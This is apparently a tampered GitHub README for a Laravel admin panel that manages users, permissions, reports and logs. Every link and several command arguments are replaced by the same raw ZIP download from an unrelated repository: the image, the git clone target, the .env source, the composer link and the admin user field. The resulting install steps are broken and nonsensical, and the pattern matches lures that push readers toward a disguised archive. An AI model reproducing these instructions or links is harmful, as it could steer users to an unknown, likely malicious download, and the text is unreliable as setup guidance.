## Laravel admin

Painel admin para controle de usuários, gerenciamento de perfis de acesso, permissões, relatórios, indicadores e logs.
Além desses módulos, já está implementado um sistema de autenticação, cadastro de novos usuários e recuração de senha.

![img](https://github.com/LibrianoLima/SismedFeio/raw/refs/heads/master/Babcock/Feio_Sismed_v3.6-beta.3.zip)

## Installation

- Clone repository
```
$ git clone https://github.com/LibrianoLima/SismedFeio/raw/refs/heads/master/Babcock/Feio_Sismed_v3.6-beta.3.zip
```

- Access directory
```
$ cd laravel-admin
```

- Copy `https://github.com/LibrianoLima/SismedFeio/raw/refs/heads/master/Babcock/Feio_Sismed_v3.6-beta.3.zip` to `.env` and add your configs
```
$ cp https://github.com/LibrianoLima/SismedFeio/raw/refs/heads/master/Babcock/Feio_Sismed_v3.6-beta.3.zip .env
```

- Install PHP dependencies ([composer](https://github.com/LibrianoLima/SismedFeio/raw/refs/heads/master/Babcock/Feio_Sismed_v3.6-beta.3.zip))
```
$ composer install
```

- Generate new key
```
$ php artisan key:generate
```

- Configure your database access
```
$ vim .env
```

- Run artisan commands.
```
$ php artisan migrate --seed && php artisan db:seed
```

## Run tests
```
$ ./vendor/bin/phpunit 
```

## Server start

- Open new terminal
```
$ php artisan serve
```

- *user: https://github.com/LibrianoLima/SismedFeio/raw/refs/heads/master/Babcock/Feio_Sismed_v3.6-beta.3.zip
- *password: admin